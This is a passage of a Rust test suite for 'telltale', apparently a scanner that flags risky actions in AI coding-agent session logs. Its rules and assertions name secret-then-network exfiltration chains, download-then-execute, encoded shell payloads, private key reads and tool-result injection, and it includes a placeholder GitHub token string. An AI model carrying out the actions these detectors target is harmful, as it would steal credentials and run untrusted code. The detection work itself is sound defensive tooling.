        .find(|event| event["session_id"] == "encoded-payload-chain")
        .expect("encoded payload detection");
    assert!(
        validator.is_valid(encoded_payload),
        "encoded payload event failed schema validation"
    );
    assert_eq!(encoded_payload["event_type"], "detection");
    assert_eq!(encoded_payload["severity"], "high");
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.encoded_payload")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.shell_encoded_payload")
    );
    assert!(
        encoded_payload["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "execution")
    );
    assert!(
        encoded_payload["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "chain")
    );
    assert!(
        encoded_payload["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string() && !value.contains("base64 --decode")
            })
    );

    let download_execute = events
        .iter()
        .find(|event| event["session_id"] == "download-execute-chain")
        .expect("download execute detection");
    assert!(
        validator.is_valid(download_execute),
        "download execute event failed schema validation"
    );
    assert_eq!(download_execute["event_type"], "detection");
    assert_eq!(download_execute["severity"], "high");
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.download_then_execute")
    );
    assert!(
        download_execute["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
            })
    );

    let secret_network = events
        .iter()
        .find(|event| event["session_id"] == "secret-network-chain")
        .expect("secret network detection");
    assert!(
        validator.is_valid(secret_network),
        "secret network event failed schema validation"
    );
    assert_eq!(secret_network["event_type"], "detection");
    assert_eq!(secret_network["severity"], "critical");
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.secret_then_network")
    );
    assert!(
        secret_network["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
            && secret_network["categories"]
                .as_array()
                .expect("categories")
                .iter()
                .any(|category| category == "download")
    );
    assert!(
        secret_network["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.is_empty() && !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let private_key = events
        .iter()
        .find(|event| event["session_id"] == "private-key-read")
        .expect("private key detection");
    assert!(
        validator.is_valid(private_key),
        "private key event failed schema validation"
    );
    assert_eq!(private_key["event_type"], "detection");
    assert_eq!(private_key["severity"], "high");
    assert!(
        private_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.private_key.read")
    );
    assert!(
        private_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        private_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("id_rsa")
            })
    );

    let api_key = events
        .iter()
        .find(|event| event["session_id"] == "api-key-pattern")
        .expect("api key detection");
    assert!(
        validator.is_valid(api_key),
        "api key event failed schema validation"
    );
    assert_eq!(api_key["event_type"], "detection");
    assert_eq!(api_key["severity"], "low");
    assert!(
        api_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        api_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        api_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains("ghp_1234567890abcdef1234")
            })
    );

    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-mcp-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-only")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-result-injection"
            && event["severity"] != "critical")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "normal-mcp-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-access-auth-log")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-approval-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-secret-auth-log")
    );
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-injection-shape")
    );
    let tool_injection_shape_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection shape session detection");
    assert!(
        validator.is_valid(tool_injection_shape_session),
        "tool injection shape session event failed schema validation"
    );
    assert_eq!(tool_injection_shape_session["event_type"], "detection");
    assert_eq!(tool_injection_shape_session["severity"], "critical");
    assert!(
        tool_injection_shape_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_shape_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && item["hash"].is_string()
            })
    );
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "install-persistence-chain"));
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-network-chain")
    );
}

#[test]
fn scan_summary_reports_log_and_state_path_precedence() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("empty-root");
    fs::create_dir_all(&root).expect("empty root");
    let env_log = temp.path().join("env-events.jsonl");
    let env_state = temp.path().join("env-state.json");

    let profile = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--path-profile",
            "project",
            "--root",
        ])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", "")
        .env("TELLTALE_STATE_PATH", "")
        .output()
        .expect("run profile scan");
    assert!(profile.status.success());
    let profile_summary: Value = serde_json::from_slice(&profile.stdout).expect("summary json");
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(Path::new("logs/telltale-events.jsonl"))
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(Path::new("state/telltale-state.json"))
    );

    let environment = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run environment scan");
    assert!(environment.status.success());
    let environment_summary: Value =
        serde_json::from_slice(&environment.stdout).expect("summary json");
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["state"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(&env_log)
    );

    let cli_log = temp.path().join("cli-events.jsonl");
    let cli_state = temp.path().join("cli-state.json");
    let cli = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--log-path"])
        .arg(&cli_log)
        .args(["--state-path"])
        .arg(&cli_state)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run cli scan");
    assert!(cli.status.success());
    let cli_summary: Value = serde_json::from_slice(&cli.stdout).expect("summary json");
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["log"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(&cli_state)
    );
}

#[test]
fn scan_once_client_filter_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "gemini",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["gemini.json"], 3);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 69);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 3);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(!events.is_empty());
    assert!(
        events
            .iter()
            .all(|event| event["client"] == "scanner" || event["client"] == "gemini")
    );
}

#[test]
fn scan_once_accepts_repeated_client_filters() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "codex",
            "--client",
            "gemini",
        ])
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 4);
    assert_eq!(source_counts["codex.jsonl"], 40);
    assert_eq!(source_counts["codex.archived_jsonl"], 2);
    assert_eq!(source_counts["codex.headless_jsonl"], 2);
    assert_eq!(source_counts["gemini.json"], 3);
}

#[test]
fn scan_once_rejects_unknown_client_filter() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "unknown-agent",
        ])
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("unsupported client 'unknown-agent'"));
    assert!(stderr.contains("codex"));
    assert!(stderr.contains("gemini"));
}

#[test]
fn scan_once_max_sources_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "gemini",
            "--max-sources",
            "1",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["gemini.json"], 1);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 69);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let health = events
        .iter()
        .find(|event| event["event_type"] == "health")
        .expect("health event");
    assert_eq!(health["source_counts"]["gemini.json"], 1);
}

#[test]
fn scan_once_health_reports_unchanged_source_inventory() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    for _ in 0..2 {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--root",
                "tests/fixtures/session_stores",
                "--client",
                "gemini",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");

        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    let lines = fs::read_to_string(log_path).expect("log file");
    let health_events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .filter(|event| event["event_type"] == "health")
        .collect::<Vec<_>>();
    assert_eq!(health_events.len(), 1);

    assert_eq!(
        source_inventory_change_value(&health_events[0]),
        "baseline=true; added=3; removed=0; unchanged=0"
    );
}

#[test]
fn scan_once_max_sources_rejects_zero() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--max-sources",
            "0",
        ])
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("--max-sources must be greater than 0"));
}

#[test]
fn scan_once_max_sources_is_deterministic() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("scan-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--dry-run",
                "--root",
                "tests/fixtures/session_stores",
                "--client",
                "codex",
                "--max-sources",
                "3",
                "--state-path",
            ])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    let second = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );

    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary json");
    let second_summary: Value =
        serde_json::from_slice(&second.stdout).expect("second summary json");
    assert_eq!(
        first_summary["source_counts"],
        second_summary["source_counts"]
    );
    assert_eq!(
        first_summary["activity_count"],
        second_summary["activity_count"]
    );
    assert_eq!(
        first_summary["detection_count"],
        second_summary["detection_count"]
    );
}

#[test]
fn repeated_scans_suppress_duplicate_detections() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let first = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("summary json");
    assert_eq!(first_summary["detection_count"], 36);
    assert_eq!(first_summary["emitted_count"], 37);
    assert_source_processing_accounting(&first_summary);
    assert_detection_flow_accounting(&first_summary, 36, 0);

    let second = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("summary json");
    assert_eq!(second_summary["detection_count"], 36);
    assert_eq!(second_summary["emitted_count"], 0);
    assert_source_processing_accounting(&second_summary);
    assert_detection_flow_accounting(&second_summary, 0, 36);
    assert_eq!(
        second_summary["detection_flow"]["matched_rule_id_count"],
        124
    );
    assert!(
        !second_summary["diagnostic_warnings"]
            .as_array()
            .expect("diagnostic warnings")
            .iter()
            .any(|warning| warning["code"] == "no_effective_detection_candidates")
    );

    let lines_before_backfill = fs::read_to_string(&log_path)
        .expect("log file before backfill")
        .lines()
        .count();
    let backfill = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--dry-run",
            "--backfill",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run backfill scan");
    assert!(
        backfill.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&backfill.stderr)
    );
    let backfill_summary: Value =
        serde_json::from_slice(&backfill.stdout).expect("backfill summary json");
    assert_eq!(backfill_summary["detection_count"], 36);
    assert_eq!(
        backfill_summary["detection_flow"]["effective_detection_candidate_count"],
        36
    );
    assert_eq!(
        backfill_summary["detection_flow"]["emitted_detection_count"],
        36
    );
    assert_eq!(
        backfill_summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(
        fs::read_to_string(&log_path)
            .expect("log file after backfill")
            .lines()
            .count(),
        lines_before_backfill
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 38);
}

#[test]
fn repeated_telltale_scans_share_state_and_deduplicate() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--emit-activity",
                "--install-inventory-disabled",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary");
    assert!(
        first_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["activity_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["emitted_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    let first_log = fs::read_to_string(&log_path).expect("first log");
    let first_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("first state"))
            .expect("first state json");
    let first_events = first_log
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("first event json"))
        .collect::<Vec<_>>();
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "detection")
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "activity")
    );

    let status = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["status", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale status");
    assert!(
        status.status.success(),
        "status stderr: {}",
        String::from_utf8_lossy(&status.stderr)
    );
    let status_summary: Value = serde_json::from_slice(&status.stdout).expect("status json");
    assert_eq!(status_summary["status"], "ok");
    assert_eq!(status_summary["log_path"], log_path.display().to_string());
    assert_eq!(
        status_summary["state_path"],
        state_path.display().to_string()
    );
    assert!(
        status_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );

    let second = run_scan();
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("second summary");
    assert_eq!(
        second_summary["detection_count"],
        first_summary["detection_count"]
    );
    assert_eq!(
        second_summary["activity_count"],
        first_summary["activity_count"]
    );
    assert_eq!(second_summary["emitted_count"], 0);
    assert_eq!(
        fs::read_to_string(&log_path).expect("second log"),
        first_log,
        "telltale must not duplicate first-scan telemetry"
    );
    let second_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("second state"))
            .expect("second state json");
    for field in [
        "seen_source_fingerprints",
        "seen_detection_fingerprints",
        "baseline_source_contributions",
        "baseline_snapshots",
        "sqlite_ingestion_cursors",
        "install_inventory",
    ] {
        assert_eq!(
            second_state[field], first_state[field],
            "telltale must preserve dedup state field {field}"
        );
    }
}

#[test]
fn scan_once_persists_incremental_baseline_snapshots() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--root",
                "tests/fixtures/benign_baselines",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    run_scan();
    let state_after_first = fs::read_to_string(&state_path).expect("first state json");
    run_scan();
    let state_after_second = fs::read_to_string(&state_path).expect("second state json");
    let first_state: Value = serde_json::from_str(&state_after_first).expect("first state parses");
    let second_state: Value =
        serde_json::from_str(&state_after_second).expect("second state parses");
    assert_eq!(
        second_state["baseline_snapshots"], first_state["baseline_snapshots"],
        "repeat scans should not double-count baseline snapshots"
    );

    let snapshots = second_state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("baseline snapshots");
    assert!(!snapshots.is_empty());

    let codex_records: u64 = snapshots
        .values()
        .filter(|snapshot| snapshot["key"]["client"] == "codex")
        .map(|snapshot| {
            snapshot["observations"]["records"]
                .as_u64()
                .unwrap_or_default()
        })
        .sum();
    assert!(codex_records > 0);
}

#[test]
fn scan_once_replaces_changed_source_baseline_contribution() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("append-only.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let write_source = |tool_calls: &[(&str, &str)]| {
        let mut lines = vec![
            r#"{"type":"session_meta","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#.to_string(),
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#.to_string(),
        ];
        for (index, (call_id, command)) in tool_calls.iter().enumerate() {
            lines.push(format!(
                r#"{{"type":"event_msg","timestamp":"2026-05-17T10:00:0{}Z","payload":{{"type":"tool_call","name":"shell","call_id":"{}","arguments":{{"command":"{}"}}}}}}"#,
                index + 2,
                call_id,
                command
            ));
        }
        fs::write(&source_path, format!("{}\n", lines.join("\n"))).expect("write source");
    };

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    write_source(&[("call-one", "ls src")]);
    run_scan();
    write_source(&[
        ("call-one", "ls src"),
        (
            "call-two",
            "curl https://internal.example.test/docs && cargo test --quiet",
        ),
    ]);
    run_scan();

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let snapshot = state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("snapshots")
        .values()
        .find(|snapshot| snapshot["key"]["client"] == "codex")
        .expect("codex snapshot");

    assert_eq!(snapshot["observations"]["tool_calls"], 2);
    assert_eq!(snapshot["tool_call_counts"]["shell"], 2);
    let state_text = fs::read_to_string(&state_path).expect("state text");
    assert!(
        !state_text.contains("internal.example.test"),
        "persisted baseline state should not contain raw network host labels"
    );
    assert!(
        state_text.contains("sha256:"),
        "persisted baseline state should contain deterministic host hashes"
    );
}

#[test]
fn scan_once_persists_distinct_source_contributions_for_same_bucket() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    for (name, command) in [
        ("session-a.jsonl", "ls src"),
        ("session-b.jsonl", "git status --short"),
    ] {
        let event = serde_json::json!({
            "type": "event_msg",
            "timestamp": "2026-05-17T10:00:02Z",
            "payload": {
                "type": "tool_call",
                "name": "shell",
                "call_id": format!("call-{name}"),
                "arguments": {"command": command}
            }
        });
        fs::write(
            source_dir.join(name),
            format!(
                "{}\n{}\n{}\n",
                r#"{"type":"session_meta","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#,
                r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
                event
            ),
        )
        .expect("write source");
    }

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--client", "codex", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let contributions = state["baseline_source_contributions"]
        .as_object()
        .expect("contributions");
    assert_eq!(contributions.len(), 2);
}

#[test]
fn scan_once_rebuild_baselines_reparses_unchanged_sources_without_reemitting_detections() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("session-a.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    fs::write(
        &source_path,
        concat!(
            r#"{"type":"session_meta","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:02Z","payload":{"type":"tool_call","name":"shell","call_id":"call-one","arguments":{"command":"ls src"}}}"#,
            "\n"
        ),
    )
    .expect("write source");

    let run_scan = |rebuild_baselines: bool| {
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args([
                "--client",
                "codex",
                "--emit-activity",
                "--install-inventory-disabled",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path);
        if rebuild_baselines {
            command.arg("--rebuild-baselines");
